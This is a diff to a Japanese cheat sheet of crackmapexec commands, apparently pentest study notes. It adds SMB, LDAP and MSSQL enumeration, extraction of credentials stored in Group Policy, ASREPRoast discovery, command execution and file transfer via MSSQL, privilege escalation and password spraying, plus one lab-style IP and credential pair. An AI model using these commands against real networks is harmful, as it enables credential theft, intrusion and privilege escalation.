@@ -14,7 +14,7 @@ SSH	22
 RDP	3389
 FTP	21
 
-//列挙
+//列挙（SMB）
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> --shares #共有フォルダの列挙
 
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> --users #ユーザー名の列挙
@@ -27,12 +27,25 @@ crackmapexec smb <IP> --groups #グループ列挙
 
 crackmapexec smb <network IP> --gen-relay-list output.txt # SMB署名が無効になっているすべてのホストを抽出するオプション
 
-crackmapexec smb <IP> -u <user> -p <pass> -M gpp_password (もしくは gpp_password) #GPOに記述された認証情報を取得する。古いサーバ（2003～2008）に有効
+crackmapexec smb <IP> -d <domain> -u <user> -p <pass> -M gpp_password (もしくは gpp_autologin) #GPOに記述された認証情報を取得する。古いサーバ（2003～2008）に有効
 
+//列挙（ldap)
 crackmapexec ldap <domain> -u user.txt -p '' --asreproast output.txt #Kerberos事前認証を必要としないASREPRoast脆弱性を持つユーザーを探す
 
 crackmapexec ldap <domain> -u <user> -p '<pass>' -M user-desc -o KEYWORDS='<key word>' # ADドメイン内のすべてのユーザーを照会してその説明を取得しキーワードにヒットしたもの表示する
 
+//列挙（mssql）
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth #mssqlのユーザか確認する「Pwn3d!」が表示されたらDB管理者
+
+crackmapexec mssql <IP> -u <user> -p '<pass>' -q "SELECT name FROM master.dbo.sysdatabases" #mssqlのすべてのデータベース名を取得するSQLクエリ
+"SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" #テーブル名
+"SELECT * from [core_app].[dbo].tbl_users" #コンテンツ内容
+
+crackmapexec mssql <IP> -u <user> -p <pass> --local-auth -x whoami #mssql経由でwindowsコマンドを実行できる
+#ターゲットにファイルをアップロードするには、オプションの--put-file後にアップロードするローカルファイルと宛先ディレクトリを指定
+#ファイルをダウンロードするには、--get-fileオプションの後にファイルのパスを指定し、出力ファイル名を設定する
+
+crackmapexec mssql <IP> -u <user> -p '<pass>' -M mssql_priv -o ACTION=privesc #権限昇格を行う　成功すればコマンドは管理者権限で実行される
 
 //パスワードスプレー
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> #入手できたパスを利用する。ユーザ名やパスはリストでも可。
